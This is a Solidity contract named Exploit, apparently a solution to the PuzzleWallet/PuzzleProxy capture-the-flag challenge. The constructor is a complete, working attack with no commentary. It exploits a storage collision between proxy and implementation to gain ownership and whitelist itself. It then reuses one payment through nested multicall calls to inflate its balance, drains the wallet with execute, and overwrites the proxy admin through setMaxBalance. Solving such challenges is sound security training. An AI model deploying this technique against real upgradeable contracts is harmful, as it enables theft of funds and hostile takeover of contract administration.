pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract Exploit{
    PuzzleProxy public proxy;

    constructor(PuzzleProxy _proxy) public payable{
        require(msg.value == 0.001 ether, "incorrect msg.value");
        proxy = _proxy;
        proxy.proposeNewAdmin(address(this));

        PuzzleWallet wallet = PuzzleWallet(address(proxy));
        wallet.addToWhitelist(address(this));
     
        bytes memory data = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory data1 = new bytes[](1);
        data1[0] = data;

        bytes memory data2 = abi.encodeWithSelector(PuzzleWallet.multicall.selector, data1);

        bytes[] memory data3 = new bytes[](2);
        data3[0] = data2;
        data3[1] = data2;
        

        wallet.multicall{value:0.001 ether}(data3);  
        uint256 balance  = wallet.balances(address(this));
        require(balance == 0.002 ether, "unexpected balance");

        wallet.execute(msg.sender, balance, new bytes(0));
        wallet.setMaxBalance(uint256(uint160(address(this))));

        require(proxy.admin() == address(this), "fail to exploit");
    }
}


